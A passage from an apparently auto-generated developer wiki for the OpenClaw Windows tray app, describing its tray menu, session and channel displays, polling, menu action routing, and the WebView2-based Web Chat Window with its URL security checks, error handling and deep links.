    Nodes["Nodes Section<br/>GatewayNodeInfo[]<br/>(if any connected)"]
    RecentActivity["Recent Activity<br/>ActivityStreamService<br/>Top 4 items"]
    Actions["Quick Actions<br/>Dashboard, Chat,<br/>Send, History"]
    Settings["Settings Section<br/>Config, Auto-start,<br/>Log file"]
    Exit["Exit"]
    
    BrandHeader --> Status
    Status --> Activity
    Activity --> Usage
    Usage --> NodeMode
    NodeMode --> Sessions
    Sessions --> Channels
    Channels --> Nodes
    Nodes --> RecentActivity
    RecentActivity --> Actions
    Actions --> Settings
    Settings --> Exit
    
    style BrandHeader fill:#ffe1e1
    style Sessions fill:#e1ffe1
    style Actions fill:#e1f5ff
```

Each section is conditionally displayed based on data availability and settings. For example, the Node Mode section only appears when `_settings.EnableNodeMode == true` [src/OpenClaw.Tray.WinUI/App.xaml.cs:803-827]().

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:737-961](), [src/OpenClaw.Tray/TrayApplication.cs:191-301]()

## Data Model to UI Mapping

The menu construction maps gateway data models to UI elements:

### Session Display

```mermaid
graph LR
    SessionInfo["SessionInfo"]
    Key["Key: string"]
    IsMain["IsMain: bool"]
    Model["Model: string"]
    TotalTokens["TotalTokens: long"]
    ContextTokens["ContextTokens: long"]
    ThinkingLevel["ThinkingLevel: string"]
    VerboseLevel["VerboseLevel: string"]
    AgeText["AgeText: string<br/>(computed)"]
    RichDisplayText["RichDisplayText: string<br/>(computed)"]
    
    SessionInfo --> Key
    SessionInfo --> IsMain
    SessionInfo --> Model
    SessionInfo --> TotalTokens
    SessionInfo --> ContextTokens
    SessionInfo --> ThinkingLevel
    SessionInfo --> VerboseLevel
    SessionInfo --> AgeText
    SessionInfo --> RichDisplayText
    
    MenuDisplay["Menu Display:<br/>'⭐ main:alerts<br/>claude-opus-4-6<br/>12.0K/200.0K ctx<br/>think high · 5m ago'"]
    
    RichDisplayText --> MenuDisplay
    AgeText --> MenuDisplay
    
    style SessionInfo fill:#e1f5ff
    style MenuDisplay fill:#e1ffe1
```

The `SessionInfo.RichDisplayText` property combines display name, model, context summary, thinking/verbose levels, and session flags into a formatted string [src/OpenClaw.Shared/Models.cs:75-119]().

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:828-883](), [tests/OpenClaw.Shared.Tests/ModelsTests.cs:726-797]()

### Channel Health Display

```mermaid
graph LR
    ChannelHealth["ChannelHealth"]
    Name["Name: string"]
    Status["Status: string"]
    IsLinked["IsLinked: bool"]
    AuthAge["AuthAge: string"]
    Error["Error: string"]
    
    ChannelHealth --> Name
    ChannelHealth --> Status
    ChannelHealth --> IsLinked
    ChannelHealth --> AuthAge
    ChannelHealth --> Error
    
    IsHealthyStatus["IsHealthyStatus()<br/>ok, connected,<br/>running, active,<br/>ready"]
    IsIntermediateStatus["IsIntermediateStatus()<br/>stopped, idle,<br/>paused, configured,<br/>pending, connecting"]
    
    Status --> IsHealthyStatus
    Status --> IsIntermediateStatus
    
    IconColor["Icon & Color:<br/>🟢 Green (healthy)<br/>🟡 Yellow (intermediate)<br/>🔴 Red (error)<br/>⚪ Gray (off/unknown)"]
    
    IsHealthyStatus --> IconColor
    IsIntermediateStatus --> IconColor
    
    style ChannelHealth fill:#e1f5ff
    style IconColor fill:#e1ffe1
```

Channel status is normalized into three categories using helper methods `IsHealthyStatus()` and `IsIntermediateStatus()`, which determine the icon and color [src/OpenClaw.Tray.WinUI/App.xaml.cs:886-907]().

**Sources:** [src/OpenClaw.Tray/TrayApplication.cs:256-281](), [tests/OpenClaw.Shared.Tests/ModelsTests.cs:238-302]()

## Real-time Updates

The menu displays live data that updates automatically based on gateway events.

### Event-Driven Menu Updates

```mermaid
sequenceDiagram
    participant Gateway as OpenClaw Gateway
    participant GatewayClient as OpenClawGatewayClient
    participant App as App.xaml.cs
    participant State as App State Fields
    participant Menu as TrayMenuWindow
    
    Gateway->>GatewayClient: event: agent<br/>(job/tool)
    GatewayClient->>App: ActivityChanged event
    App->>State: Update _currentActivity
    App->>State: Update _sessionActivities[key]
    Note over App: Menu rebuilt on next click
    
    Gateway->>GatewayClient: event: health<br/>(channels)
    GatewayClient->>App: ChannelHealthUpdated event
    App->>State: Update _lastChannels[]
    
    Gateway->>GatewayClient: res: sessions.list
    GatewayClient->>App: SessionsUpdated event
    App->>State: Update _lastSessions[]
    
    Gateway->>GatewayClient: res: usage.status
    GatewayClient->>App: UsageStatusUpdated event
    App->>State: Update _lastUsageStatus
    
    Gateway->>GatewayClient: res: usage.cost
    GatewayClient->>App: UsageCostUpdated event
    App->>State: Update _lastUsageCost
    
    Note over App,Menu: User clicks tray icon
    App->>GatewayClient: Pre-fetch:<br/>CheckHealthAsync()<br/>RequestSessionsAsync()<br/>RequestUsageAsync()
    App->>Menu: BuildTrayMenuPopup()<br/>using cached state
    Menu->>Menu: Display to user
```

All gateway events are marshaled to the UI thread via `SynchronizationContext` to ensure thread-safe updates [src/OpenClaw.Shared/OpenClawGatewayClient.cs:46-57]().

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:46-56](), [src/OpenClaw.Shared/OpenClawGatewayClient.cs:762-836]()

### Polling & Health Checks

In addition to event-driven updates, the application performs periodic polling:

```mermaid
graph TB
    HealthTimer["_healthCheckTimer<br/>Every 30 seconds"]
    SessionTimer["_sessionPollTimer<br/>Every 60 seconds"]
    
    HealthCheck["CheckHealthAsync()"]
    SessionRequest["RequestSessionsAsync()"]
    UsageRequest["RequestUsageAsync()"]
    NodesRequest["RequestNodesAsync()"]
    
    HealthTimer --> HealthCheck
    SessionTimer --> SessionRequest
    SessionTimer --> UsageRequest
    SessionTimer --> NodesRequest
    
    HealthCheck --> UpdateChannels["Update _lastChannels<br/>via ChannelHealthUpdated"]
    SessionRequest --> UpdateSessions["Update _lastSessions<br/>via SessionsUpdated"]
    UsageRequest --> UpdateUsage["Update _lastUsage<br/>via UsageUpdated"]
    NodesRequest --> UpdateNodes["Update _lastNodes<br/>via NodesUpdated"]
    
    style HealthTimer fill:#ffe1e1
    style SessionTimer fill:#ffe1e1
```

The health check timer runs more frequently (30s) than the session/usage poll (60s) to maintain responsive status updates without excessive API calls [src/OpenClaw.Tray.WinUI/App.xaml.cs:38-39]().

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:276-278](), [src/OpenClaw.Tray/TrayApplication.cs:152-158]()

## Menu Implementation: WinUI vs WinForms

The codebase includes two implementations of the tray menu with different UI frameworks.

### WinUI Implementation (`OpenClaw.Tray.WinUI`)

Uses a custom `TrayMenuWindow` that displays as a frameless popup window positioned near the cursor.

**Key Classes:**
- `TrayIcon` from WinUIEx library [src/OpenClaw.Tray.WinUI/App.xaml.cs:323-327]()
- `TrayMenuWindow` custom borderless window [src/OpenClaw.Tray.WinUI/Windows/TrayMenuWindow.xaml.cs:15-271]()

**Window Styling:**
The window removes the title bar using Win32 `SetWindowLong` API to avoid Bug 57667927, which causes crashes when setting `IsTitleBarVisible = false` [src/OpenClaw.Tray.WinUI/Windows/TrayMenuWindow.xaml.cs:107-120]().

**Positioning:**
```mermaid
graph LR
    GetCursor["GetCursorPos()<br/>Win32 API"]
    GetMonitor["MonitorFromPoint()<br/>Find monitor at cursor"]
    GetWorkArea["GetMonitorInfo()<br/>Get work area bounds"]
    CalcDPI["GetDpiForWindow()<br/>Scale dimensions"]
    Position["Calculate position:<br/>Above cursor by default<br/>Keep within work area"]
    
    GetCursor --> GetMonitor
    GetMonitor --> GetWorkArea
    GetWorkArea --> CalcDPI
    CalcDPI --> Position
```

The menu is positioned above the cursor (since the tray is typically at the bottom) and kept within the monitor's work area [src/OpenClaw.Tray.WinUI/Windows/TrayMenuWindow.xaml.cs:122-146]().

**Menu Items:**
Items are added as `Button` elements with hover effects and click handlers [src/OpenClaw.Tray.WinUI/Windows/TrayMenuWindow.xaml.cs:152-197]().

**Sources:** [src/OpenClaw.Tray.WinUI/Windows/TrayMenuWindow.xaml.cs:79-271](), [src/OpenClaw.Tray.WinUI/App.xaml.cs:329-335]()

### WinForms Implementation (`OpenClaw.Tray`)

Uses either a standard `ContextMenuStrip` or a custom `ModernTrayMenu` with Windows 11 styling.

**Key Classes:**
- `NotifyIcon` standard WinForms tray icon [src/OpenClaw.Tray/TrayApplication.cs:143-150]()
- `ContextMenuStrip` for legacy menu [src/OpenClaw.Tray/TrayApplication.cs:87-137]()
- `ModernTrayMenu` custom menu with modern styling [src/OpenClaw.Tray/TrayApplication.cs:139-141]()

**Modern Menu:**
The `ModernTrayMenu` provides a more contemporary appearance with colored status indicators and icon support [src/OpenClaw.Tray/TrayApplication.cs:191-301]().

**Icon Rendering:**
The WinForms version includes a `DrawPixelLobster` method that renders the lobster icon pixel-by-pixel for consistent appearance [src/OpenClaw.Tray/TrayApplication.cs:762-817]().

**Sources:** [src/OpenClaw.Tray/TrayApplication.cs:16-163](), [src/OpenClaw.Tray/TrayApplication.cs:191-301]()

## Menu Actions & Handlers

Menu items trigger various actions through a centralized handler.

### Action Routing

```mermaid
graph TB
    MenuClick["Menu item clicked"]
    Handler["OnTrayMenuItemClicked()"]
    
    Status["'status' →<br/>ShowStatusDetail()"]
    Dashboard["'dashboard' →<br/>OpenDashboard()"]
    WebChat["'webchat' →<br/>ShowWebChat()"]
    QuickSend["'quicksend' →<br/>ShowQuickSend()"]
    Settings["'settings' →<br/>ShowSettings()"]
    Activity["'activity:*' →<br/>ShowActivityStream()"]
    Channel["'channel:*' →<br/>ToggleChannel()"]
    Session["'session:*' →<br/>OpenDashboard(sessions/{key})"]
    SessionAction["'session-reset|key' →<br/>ExecuteSessionActionAsync()"]
    
    MenuClick --> Handler
    Handler --> Status
    Handler --> Dashboard
    Handler --> WebChat
    Handler --> QuickSend
    Handler --> Settings
    Handler --> Activity
    Handler --> Channel
    Handler --> Session
    Handler --> SessionAction
    
    style Handler fill:#e1f5ff
```

The handler uses string prefixes to route actions. For example, items starting with `"session:"` open the dashboard to that session's detail page [src/OpenClaw.Tray.WinUI/App.xaml.cs:517-563]().

**Session Management Actions:**

The menu provides direct session management through special action prefixes:

| Action Pattern | Effect |
|----------------|--------|
| `session-reset\|{key}` | Reset session to fresh state |
| `session-compact\|{key}` | Compact session log to recent lines |
| `session-delete\|{key}` | Delete session and archive transcript |
| `session-thinking\|{level}\|{key}` | Set thinking level (off/low/high) |
| `session-verbose\|{level}\|{key}` | Toggle verbose mode (on/off) |

These actions send gateway API requests and refresh the session list [src/OpenClaw.Tray.WinUI/App.xaml.cs:616-686]().

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:517-563](), [src/OpenClaw.Tray/TrayApplication.cs:303-352]()

### Channel Toggle Behavior

Clicking a channel item toggles its state:

```mermaid
graph LR
    Click["User clicks channel item"]
    Check["Check current status<br/>IsHealthyStatus()"]
    Running{Is running?}
    Stop["StopChannelAsync(name)"]
    Start["StartChannelAsync(name)"]
    Delay["Wait 500ms"]
    Refresh["CheckHealthAsync()"]
    
    Click --> Check
    Check --> Running
    Running -->|Yes| Stop
    Running -->|No| Start
    Stop --> Delay
    Start --> Delay
    Delay --> Refresh
```

The toggle uses `ChannelHealth.IsHealthyStatus()` to determine if the channel is running, then sends the appropriate start/stop command [src/OpenClaw.Tray.WinUI/App.xaml.cs:559-561]().

**Sources:** [src/OpenClaw.Tray/TrayApplication.cs:371-395](), [src/OpenClaw.Shared/OpenClawGatewayClient.cs:268-314]()

## Session-Aware Activity Display

The tray icon and menu display activity from multiple concurrent sessions. To avoid rapid switching between sessions, a session-aware tracking system is used.

### Activity Resolution Logic

```mermaid
graph TB
    IncomingActivity["New AgentActivity received"]
    UpdateDict["Store in<br/>_sessionActivities[key]"]
    
    IsMain{Is main session<br/>and active?}
    UseMain["Display main session<br/>Set _displayedSessionKey"]
    
    CurrentActive{Is currently<br/>displayed session<br/>still active?}
    KeepCurrent["Keep current session<br/>(debounce)"]
    
    Debounce{Has 3 seconds<br/>passed since<br/>last switch?}
    AllowSwitch["Allow switch to<br/>new active session"]
    
    AnyMainActive{Any main<br/>session active?}
    UseAnyMain["Switch to main"]
    
    IncomingActive{Incoming<br/>session active?}
    UseIncoming["Switch to incoming"]
    ShowIdle["Show idle"]
    
    IncomingActivity --> UpdateDict
    UpdateDict --> IsMain
    IsMain -->|Yes| UseMain
    IsMain -->|No| CurrentActive
    CurrentActive -->|Yes| Debounce
    Debounce -->|No| KeepCurrent
    Debounce -->|Yes| AnyMainActive
    CurrentActive -->|No| AnyMainActive
    AnyMainActive -->|Yes| UseAnyMain
    AnyMainActive -->|No| IncomingActive
    IncomingActive -->|Yes| UseIncoming
    IncomingActive -->|No| ShowIdle
    
    style UpdateDict fill:#e1f5ff
    style KeepCurrent fill:#ffe1e1
```

This logic prioritizes the main session but avoids rapid switching by applying a 3-second debounce window [src/OpenClaw.Tray/TrayApplication.cs:564-612]().

**Sources:** [src/OpenClaw.Tray/TrayApplication.cs:536-562](), [src/OpenClaw.Tray.WinUI/App.xaml.cs:58-62]()

## Pre-creation & Reuse Strategy

To avoid crashes when creating windows after the application has been idle, the WinUI version pre-creates and reuses the menu window.

### Window Lifecycle

```mermaid
sequenceDiagram
    participant Startup as Application Startup
    participant KeepAlive as _keepAliveWindow
    participant MenuWin as _trayMenuWindow
    participant User as User
    
    Startup->>KeepAlive: InitializeKeepAliveWindow()<br/>Create hidden anchor window
    Note over KeepAlive: Prevents GC/threading issues
    Startup->>MenuWin: InitializeTrayMenuWindow()<br/>Pre-create menu window
    Note over MenuWin: Window created once,<br/>reused for all shows
    
    User->>MenuWin: Click tray icon
    MenuWin->>MenuWin: ClearItems()<br/>BuildTrayMenuPopup()
    MenuWin->>MenuWin: ShowAtCursor()
    Note over MenuWin: Window activated,<br/>not re-created
    
    User->>MenuWin: Click outside menu
    MenuWin->>MenuWin: Hide()<br/>(not Close)
    Note over MenuWin: Window hidden,<br/>ready for reuse
```

The keep-alive window is a minimal hidden window that anchors the WinUI runtime, preventing threading issues when creating windows after idle periods [src/OpenClaw.Tray.WinUI/App.xaml.cs:302-312]().

The menu window is pre-created at startup and reused by hiding/showing rather than creating/destroying [src/OpenClaw.Tray.WinUI/App.xaml.cs:329-335]().

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:302-335](), [src/OpenClaw.Tray.WinUI/Windows/TrayMenuWindow.xaml.cs:97-103]()

---

# Page: Web Chat Window

# Web Chat Window

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [src/OpenClaw.CommandPalette/Pages/OpenClawPage.cs](src/OpenClaw.CommandPalette/Pages/OpenClawPage.cs)
- [src/OpenClaw.Tray.WinUI/Dialogs/QuickSendDialog.cs](src/OpenClaw.Tray.WinUI/Dialogs/QuickSendDialog.cs)
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml](src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml)
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml.cs](src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml.cs)

</details>



The Web Chat Window provides an embedded browser interface to the OpenClaw Gateway's web UI, allowing users to interact with the AI assistant through a native Windows window without opening an external browser. The window uses Microsoft's WebView2 control to render the gateway's web interface within the tray application.

For sending quick messages without opening a full chat interface, see [Quick Send Dialog](#2.4). For general system integration and deep link handling, see [Deep Links & URI Schemes](#5.2).

## Purpose and Architecture

The `WebChatWindow` class wraps a WebView2 control to display the OpenClaw Gateway's web interface. It automatically converts the WebSocket gateway URL to an HTTP/HTTPS URL, appends authentication tokens, and enforces security policies around protocol usage.

**Core Components:**

| Component | Type | Purpose |
|-----------|------|---------|
| `WebChatWindow` | WinUI Window | Main window class extending `WindowEx` |
| `WebView` | WebView2 | Embedded Chromium browser control |
| Navigation Toolbar | UI Controls | Home, Refresh, Pop-out, DevTools buttons |
| Error Panel | UI Panel | Displays connection/certificate errors |
| Loading Ring | ProgressRing | Shows navigation progress |

**Window Initialization:**

```mermaid
sequenceDiagram
    participant User
    participant TrayApp as "TrayApp"
    participant Window as "WebChatWindow"
    participant WebView2 as "WebView2 Control"
    participant Gateway as "Gateway Web UI"
    
    User->>TrayApp: "Click 'Web Chat' or openclaw://chat"
    TrayApp->>Window: "new WebChatWindow(gatewayUrl, token)"
    Window->>Window: "InitializeComponent()"
    Window->>Window: "SetWindowSize(520, 750)"
    Window->>Window: "CenterOnScreen()"
    Window->>Window: "SetIcon()"
    
    Note over Window: "Async initialization starts"
    Window->>WebView2: "EnsureCoreWebView2Async()"
    WebView2-->>Window: "CoreWebView2 initialized"
    Window->>WebView2: "Configure settings"
    Window->>WebView2: "Register event handlers"
    Window->>Window: "NavigateToChat()"
    Window->>Window: "TryBuildChatUrl()"
    Window->>WebView2: "Navigate(url + ?token=...)"
    WebView2->>Gateway: "HTTP/HTTPS request"
    Gateway-->>WebView2: "Web UI HTML"
    WebView2-->>User: "Display chat interface"
```

**Sources:**
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml.cs:27-46]()
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml.cs:62-81]()

## URL Construction and Security

The window converts WebSocket gateway URLs to web URLs and enforces security policies to prevent insecure connections.

### Protocol Conversion

The `TryBuildChatUrl` method handles URL transformation:

```mermaid
graph TB
    Input["Input: _gatewayUrl<br/>(ws:// or wss://)"]
    Normalize["GatewayUrlHelper.TryNormalizeWebSocketUrl()"]
    Parse["Uri.TryCreate()"]
    ConvertScheme["Convert Scheme:<br/>wss → https<br/>ws → http"]
    CheckSecurity{"Is http AND<br/>NOT localhost?"}
    Error["Return error:<br/>HTTPS required for remote"]
    BuildURL["Build URL:<br/>{scheme}://{host}:{port}?token={token}"]
    Success["Return chat URL"]
    
    Input --> Normalize
    Normalize --> Parse
    Parse --> ConvertScheme
    ConvertScheme --> CheckSecurity
    CheckSecurity -->|"Yes (insecure)"| Error
    CheckSecurity -->|"No (secure or local)"| BuildURL
    BuildURL --> Success
```

**Security Enforcement:**

| Condition | Gateway URL | Allowed? | Reason |
|-----------|------------|----------|---------|
| Local WS | `ws://localhost:18789` | ✅ Yes | Localhost exempted |
| Local WSS | `wss://localhost:18789` | ✅ Yes | Secure |
| Remote WSS | `wss://example.com:18789` | ✅ Yes | Secure |
| Remote WS | `ws://192.168.1.10:18789` | ❌ No | Browsers enforce HTTPS for remote |

**Sources:**
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml.cs:179-216]()
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml.cs:191-205]()

### IsLocalHost Detection

The method uses `Uri.IsLoopback` and hostname comparison:

```mermaid
graph LR
    URI["Uri object"]
    Loopback{"uri.IsLoopback?"}
    HostCheck{"uri.Host ==<br/>'localhost'<br/>(case-insensitive)?"}
    Local["IsLocalHost = true"]
    Remote["IsLocalHost = false"]
    
    URI --> Loopback
    Loopback -->|"True"| Local
    Loopback -->|"False"| HostCheck
    HostCheck -->|"True"| Local
    HostCheck -->|"False"| Remote
```

**Sources:**
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml.cs:174-177]()

## WebView2 Initialization

The initialization process sets up the WebView2 control with proper configuration and event handlers.

### Initialization Sequence

```mermaid
graph TB
    Start["InitializeWebViewAsync()"]
    CreateFolder["Create user data folder:<br/>%LOCALAPPDATA%\OpenClawTray\WebView2"]
    SetEnvVar["Set WEBVIEW2_USER_DATA_FOLDER env var"]
    Ensure["await WebView.EnsureCoreWebView2Async()"]
    Configure["Configure CoreWebView2.Settings:<br/>- IsStatusBarEnabled = false<br/>- AreDefaultContextMenusEnabled = true<br/>- IsZoomControlEnabled = true"]
    RegisterNav["Register NavigationCompleted handler"]
    RegisterStart["Register NavigationStarting handler"]
    Navigate["NavigateToChat()"]
    Success["Window displays chat UI"]
    
    Start --> CreateFolder
    CreateFolder --> SetEnvVar
    SetEnvVar --> Ensure
    Ensure --> Configure
    Configure --> RegisterNav
    RegisterNav --> RegisterStart
    RegisterStart --> Navigate
    Navigate --> Success
```

**WebView2 Configuration:**

| Setting | Value | Purpose |
|---------|-------|---------|
| `IsStatusBarEnabled` | `false` | Hide browser status bar |
| `AreDefaultContextMenusEnabled` | `true` | Allow right-click menu |
| `IsZoomControlEnabled` | `true` | Allow Ctrl+/- zoom |
| User Data Folder | `%LOCALAPPDATA%\OpenClawTray\WebView2` | Persistent browser storage |

**Sources:**
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml.cs:62-136]()
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml.cs:69-78]()
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml.cs:84-86]()

## Navigation Event Handling

The window monitors navigation events to show loading indicators and handle errors.

### Navigation Lifecycle

```mermaid
sequenceDiagram
    participant User
    participant Window as "WebChatWindow"
    participant Handler as "Event Handlers"
    participant WebView as "CoreWebView2"
    participant UI as "UI Elements"
    
    Note over User,UI: "User triggers navigation"
    User->>Window: "Click Home/Refresh"
    Window->>WebView: "Navigate(url) or Reload()"
    
    Note over WebView,UI: "NavigationStarting event"
    WebView->>Handler: "_navigationStartingHandler"
    Handler->>UI: "LoadingRing.IsActive = true"
    Handler->>UI: "LoadingRing.Visibility = Visible"
    
    Note over WebView,UI: "Navigation completes"
    WebView->>Handler: "_navigationCompletedHandler"
    Handler->>UI: "LoadingRing.IsActive = false"
    Handler->>UI: "LoadingRing.Visibility = Collapsed"
    
    alt "Navigation failed"
        Handler->>Handler: "Check WebErrorStatus"
        Handler->>Window: "ShowErrorMessage()"
        Window->>UI: "Display error panel"
    else "Navigation succeeded"
        UI->>User: "Display loaded page"
    end
```

**Sources:**
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml.cs:88-133]()

### Error Detection and Messages

The `NavigationCompleted` handler detects specific error conditions and displays user-friendly messages:

**Connection Errors:**

| WebErrorStatus | Condition | User Message |
|----------------|-----------|--------------|
| `ConnectionAborted` | Gateway unreachable | "Can't reach OpenClaw Gateway" + VPN/SSH instructions |
| `CannotConnect` | Connection refused | Same as above |
| `ConnectionReset` | Connection dropped | Same as above |
| `ServerUnreachable` | Network unavailable | Same as above |

**Certificate Errors:**

```mermaid
graph TB
    NavComplete["NavigationCompleted event"]
    Success{"e.IsSuccess?"}
    CheckError{"WebErrorStatus<br/>contains 'Certificate'?"}
    ShowCertError["ShowErrorMessage():<br/>- Certificate not trusted<br/>- Use trusted HTTPS endpoint<br/>- Import cert to Windows<br/>- Or use SSH tunnel"]
    CheckConnError{"Connection error?"}
    ShowConnError["ShowErrorMessage():<br/>- Gateway not responding<br/>- Check gateway running<br/>- Connect via VPN<br/>- Or use SSH tunnel"]
    Done["Hide loading indicator"]
    
    NavComplete --> Success
    Success -->|"No"| CheckError
    CheckError -->|"Yes"| ShowCertError
    CheckError -->|"No"| CheckConnError
    CheckConnError -->|"Yes"| ShowConnError
    CheckConnError -->|"No"| Done
    Success -->|"Yes"| Done
```

**Sources:**
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml.cs:89-122]()
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml.cs:96-109]()
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml.cs:111-121]()

## Window UI Components

The window consists of a toolbar and the main WebView2 control, with error and loading overlays.

### UI Structure

```mermaid
graph TB
    Window["WebChatWindow<br/>(WindowEx)"]
    Grid["Grid<br/>(2 rows)"]
    Toolbar["StackPanel<br/>(Row 0, Toolbar)"]
    Content["Row 1<br/>(Content area)"]
    
    HomeBtn["HomeButton<br/>Glyph: E80F"]
    RefreshBtn["RefreshButton<br/>Glyph: E72C"]
    PopoutBtn["PopoutButton<br/>Glyph: E8A7"]
    DevToolsBtn["DevToolsButton<br/>Glyph: E90F"]
    
    WebView["WebView2<br/>(Main content)"]
    LoadingRing["ProgressRing<br/>(Overlay)"]
    ErrorPanel["ScrollViewer<br/>(Error display)"]
    ErrorText["TextBlock<br/>(Error details)"]
    
    Window --> Grid
    Grid --> Toolbar
    Grid --> Content
    
    Toolbar --> HomeBtn
    Toolbar --> RefreshBtn
    Toolbar --> PopoutBtn
    Toolbar --> DevToolsBtn
    
    Content --> WebView
    Content --> LoadingRing
    Content --> ErrorPanel
    ErrorPanel --> ErrorText
```

**Toolbar Actions:**

| Button | Glyph | ToolTip | Handler | Action |
|--------|-------|---------|---------|--------|
| Home | `&#xE80F;` | Home | `OnHome` | Calls `NavigateToChat()` |
| Refresh | `&#xE72C;` | Refresh | `OnRefresh` | Calls `WebView.CoreWebView2.Reload()` |
| Pop-out | `&#xE8A7;` | Open in Browser | `OnPopout` | Launches URL in default browser |
| DevTools | `&#xE90F;` | Developer Tools | `OnDevTools` | Calls `WebView.CoreWebView2.OpenDevToolsWindow()` |

**Sources:**
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml:13-62]()
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml:19-43]()
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml.cs:251-283]()

### Window Properties

The window is configured with specific dimensions and visual properties:

**Configuration:**

| Property | Value | Purpose |
|----------|-------|---------|
| Default Size | 520 × 750 | Comfortable chat width |
| Minimum Size | 380 × 450 | Prevent unusable dimensions |
| Position | Centered on screen | Better UX than default position |
| Icon | Status icon path | Matches tray icon state |
| Backdrop | Mica | Modern Windows 11 visual |

**Sources:**
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml.cs:36-40]()
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml:9-11]()

## Error Display and Fallback

When WebView2 fails to initialize or navigate, the window displays detailed error information.

### Initialization Error Handling

```mermaid
graph TB
    Init["InitializeWebViewAsync()"]
    TryInit["try block:<br/>WebView2 initialization"]
    Catch["catch (Exception ex)"]
    LogError["Logger.Error():<br/>- Exception type<br/>- HResult<br/>- Message<br/>- Stack trace<br/>- Inner exception"]
    HideLoading["LoadingRing.Visibility = Collapsed"]
    HideWebView["WebView.Visibility = Collapsed"]
    ShowError["ErrorPanel.Visibility = Visible"]
    BuildDetails["Build error details:<br/>- Exception info<br/>- HResult<br/>- App directory<br/>- Architecture<br/>- OS description<br/>- Stack trace"]
    DisplayError["ErrorText.Text = errorDetails"]
    
    Init --> TryInit
    TryInit -->|"Exception"| Catch
    Catch --> LogError
    LogError --> HideLoading
    HideLoading --> HideWebView
    HideWebView --> ShowError
    ShowError --> BuildDetails
    BuildDetails --> DisplayError
```

**Error Information Displayed:**

The error panel shows comprehensive diagnostic information:

- Exception type and HResult
- Error message
- Application directory path
- Process architecture (x64/ARM64)
- OS description
- Full stack trace
- Inner exception details (if present)

**Sources:**
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml.cs:138-168]()
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml:52-61]()

### ShowErrorMessage Method

The `ShowErrorMessage` method displays user-friendly error messages for navigation failures:

```mermaid
graph LR
    Call["ShowErrorMessage(message)"]
    HideLoading["LoadingRing.IsActive = false<br/>LoadingRing.Visibility = Collapsed"]
    HideWebView["WebView.Visibility = Collapsed"]
    ShowPanel["ErrorPanel.Visibility = Visible"]
    SetText["ErrorText.Text = message"]
    
    Call --> HideLoading
    HideLoading --> HideWebView
    HideWebView --> ShowPanel
    ShowPanel --> SetText
```

**Sources:**
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml.cs:218-225]()

## Event Handler Cleanup

The window properly cleans up WebView2 event handlers to prevent memory leaks.

### Cleanup Flow

```mermaid
sequenceDiagram
    participant User
    participant Window as "WebChatWindow"
    participant Handlers as "Event Handlers"
    participant WebView as "CoreWebView2"
    
    Note over User,WebView: "Window closing"
    User->>Window: "Close window"
    Window->>Window: "Closed event fires"
    Window->>Window: "OnWindowClosed()"
    Window->>Window: "IsClosed = true"
    
    Window->>Window: "Check CoreWebView2 != null"
    Window->>WebView: "Unregister _navigationCompletedHandler"
    Window->>WebView: "Unregister _navigationStartingHandler"
    
    Note over Window: "Event handlers are nulled,<br/>preventing further callbacks"
```

**Handler Storage:**

The class stores event handlers as fields for cleanup:

- `_navigationCompletedHandler`: `TypedEventHandler<CoreWebView2, CoreWebView2NavigationCompletedEventArgs>?`
- `_navigationStartingHandler`: `TypedEventHandler<CoreWebView2, CoreWebView2NavigationStartingEventArgs>?`

**Sources:**
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml.cs:21-24]()
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml.cs:48-60]()

## Deep Link Integration

The Web Chat Window can be opened via the `openclaw://chat` deep link URI scheme.

### Deep Link Flow

```mermaid
sequenceDiagram
    participant User
    participant Windows as "Windows Shell"
    participant TrayApp as "OpenClaw.Tray.WinUI"
    participant MainWindow as "MainWindow"
    participant WebChatWindow as "WebChatWindow"
    
    User->>Windows: "Click link: openclaw://chat"
    Windows->>TrayApp: "Protocol activation"
    TrayApp->>MainWindow: "HandleDeepLink('openclaw://chat')"
    MainWindow->>MainWindow: "Parse URI scheme"
    MainWindow->>WebChatWindow: "new WebChatWindow(gatewayUrl, token)"
    WebChatWindow->>User: "Display chat window"
```

**PowerToys Command Palette Integration:**

The Command Palette extension provides a "Web Chat" command:

```
Title: "💬 Web Chat"
Subtitle: "Open the OpenClaw chat window"
Command: new OpenUrlCommand("openclaw://chat")
```

**Sources:**
- [src/OpenClaw.CommandPalette/Pages/OpenClawPage.cs:27-31]()

## Debug Mode

The window includes a debug constant for testing WebView2 without a gateway connection.

### Debug URL Override

```mermaid
graph TB
    Navigate["NavigateToChat()"]
    CheckDebug{"DEBUG_TEST_URL<br/>!= null?"}
